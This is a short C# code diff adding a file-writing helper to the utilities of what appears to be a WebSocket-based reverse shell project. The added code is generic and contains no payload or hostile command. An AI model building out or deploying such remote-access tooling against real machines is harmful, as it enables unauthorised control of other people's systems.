@@ -161,6 +161,35 @@ namespace WebSocketReverseShellDotNet.utils
             return Directory.Exists(expandedPath);
         }
 
+
+        public static string? CreateFileWithContent(string directoryPath, string fileName, string content)
+        {
+            try
+            {
+                // Check if the content is empty or null
+                if (string.IsNullOrEmpty(content))
+                {
+                    Console.WriteLine("Content is empty or null. File creation aborted.");
+                    return null;
+                }
+
+                // Combine the directory path and file name to create the full file path
+                string filePath = Path.Combine(directoryPath, fileName);
+
+                // Write the content to the file
+                File.WriteAllText(filePath, content);
+
+                // Return the full file path
+                return filePath;
+            }
+            catch (Exception ex)
+            {
+                // Handle any exceptions that might occur during file creation
+                Console.WriteLine($"Error creating file: {ex.Message}");
+                return null;
+            }
+        }
+
         public static string CopyFileWithNumberPreAppended(string sourcePath, string destinationDirectory, int fileNumber)
         {
 
